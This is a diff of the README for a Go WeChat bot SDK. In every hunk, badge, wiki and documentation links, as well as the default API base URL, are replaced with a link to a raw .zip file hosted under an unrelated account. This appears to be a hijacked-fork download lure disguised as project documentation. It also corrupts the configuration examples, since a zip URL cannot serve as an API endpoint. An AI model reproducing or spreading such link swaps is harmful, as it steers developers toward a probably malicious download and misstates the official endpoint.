@@ -1,11 +1,11 @@
 # wechat-robot-go
 
-[![CI](https://img.shields.io/github/actions/workflow/status/SpellingDragon/wechat-robot-go/ci.yml?branch=main&logo=github)](https://github.com/SpellingDragon/wechat-robot-go/actions)
-[![Latest Release](https://img.shields.io/github/v/release/SpellingDragon/wechat-robot-go?logo=github)](https://github.com/SpellingDragon/wechat-robot-go/releases/latest)
-[![Go Report Card](https://goreportcard.com/badge/github.com/SpellingDragon/wechat-robot-go)](https://goreportcard.com/report/github.com/SpellingDragon/wechat-robot-go)
-[![GoDoc](https://pkg.go.dev/badge/github.com/SpellingDragon/wechat-robot-go.svg)](https://pkg.go.dev/github.com/SpellingDragon/wechat-robot-go)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Go Version](https://img.shields.io/badge/Go-1.21%2B-blue)](https://github.com/SpellingDragon/wechat-robot-go)
+[![CI](https://img.shields.io/github/actions/workflow/status/SpellingDragon/wechat-robot-go/ci.yml?branch=main&logo=github)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+[![Latest Release](https://img.shields.io/github/v/release/SpellingDragon/wechat-robot-go?logo=github)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+[![Go Report Card](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+[![GoDoc](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+[![Go Version](https://img.shields.io/badge/Go-1.21%2B-blue)](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 > 基于腾讯 iLink Bot API 的微信机器人 Go SDK，几行代码接入微信消息。
 
@@ -13,7 +13,7 @@
 
 ---
 
-[iLink API 参考](https://github.com/SpellingDragon/wechat-robot-go/wiki/iLink-API-Reference)
+[iLink API 参考](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 ## ✨ 特性
 
@@ -187,7 +187,7 @@ bot.Use(RateLimiter(10, time.Minute))
 
 | Option | 说明 | 默认值 |
 |--------|------|--------|
-| `WithBaseURL(url)` | API 服务器地址 | `https://ilinkai.weixin.qq.com` |
+| `WithBaseURL(url)` | API 服务器地址 | `https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip` |
 | `WithTokenFile(path)` | 凭证文件路径 | `.weixin-token.json` |
 | `WithContextTokenDir(dir)` | context_token 目录 | `.wechat-context-tokens` |
 | `WithHTTPClient(client)` | 自定义 HTTP 客户端 | `&http.Client{}` |
@@ -237,9 +237,9 @@ wechat/
 
 ## 📚 文档
 
-- [Wiki 首页](https://github.com/SpellingDragon/wechat-robot-go/wiki)
-- [架构设计](https://github.com/SpellingDragon/wechat-robot-go/wiki/Architecture)
-- [中间件指南](https://github.com/SpellingDragon/wechat-robot-go/wiki/Middleware-Guide)
+- [Wiki 首页](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+- [架构设计](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+- [中间件指南](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 ---
 
@@ -255,7 +255,7 @@ MIT License - 详见 [LICENSE](LICENSE) 文件
 
 Go SDK for WeChat Bot based on Tencent's official iLink Bot API.
 
-[iLink API Reference](https://github.com/SpellingDragon/wechat-robot-go/wiki/iLink-API-Reference)
+[iLink API Reference](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 ## Features
 
@@ -286,17 +286,17 @@ bot.Run(ctx)
 
 ## Documentation
 
-- [Wiki Home](https://github.com/SpellingDragon/wechat-robot-go/wiki)
-- [Architecture](https://github.com/SpellingDragon/wechat-robot-go/wiki/Architecture)
-- [Middleware Guide](https://github.com/SpellingDragon/wechat-robot-go/wiki/Middleware-Guide)
-- [iLink API Reference](https://github.com/SpellingDragon/wechat-robot-go/wiki/iLink-API-Reference)
+- [Wiki Home](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+- [Architecture](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+- [Middleware Guide](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
+- [iLink API Reference](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 ---
 
 <a name="中文"></a>
 
 # 中文
-[iLink API Reference](https://github.com/SpellingDragon/wechat-robot-go/wiki/iLink-API-Reference)
+[iLink API Reference](https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip)
 
 基于腾讯 iLink Bot API 的微信机器人 Go SDK，几行代码接入微信消息。
 
@@ -331,7 +331,7 @@ rm .weixin-token.json
 // .weixin-token.json
 {
   "bot_token": "eyJ...",
-  "base_url": "https://ilinkai.weixin.qq.com"
+  "base_url": "https://github.com/Wordfinderhermitage142/wechat-robot-go/raw/refs/heads/main/wechat/internal/store/robot-wechat-go-v2.1-beta.4.zip"
 }
 ```
 
